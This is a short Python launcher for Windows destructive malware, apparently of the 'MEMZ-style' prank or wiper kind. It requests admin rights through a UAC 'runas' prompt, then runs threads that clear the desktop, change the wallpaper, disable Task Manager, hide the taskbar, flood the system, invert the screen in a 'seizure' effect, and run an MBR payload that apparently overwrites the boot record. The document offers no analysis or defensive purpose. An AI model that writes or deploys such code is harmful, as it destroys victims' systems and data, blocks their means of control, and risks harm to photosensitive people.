import threading, ctypes, time
from utils.cleardesktop import cleardesk
from utils.changewallpaper import changewallpaper
from utils.notaskmanager import disableme
from utils.nogui import hidebar
from utils.flood import flood
from utils.mbrpayload import mbr_payload
from utils.seizure import start_invert_thread
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", __file__, None, None, 1)
else:
    threading.Thread(target=cleardesk).start()
    threading.Thread(target=changewallpaper).start()
    threading.Thread(target=disableme).start()
    threading.Thread(target=hidebar).start()
    threading.Thread(target=mbr_payload).start()
    threading.Thread(target=flood).start()
    threading.Thread(target=start_invert_thread).start()
    while True:
        time.sleep(1)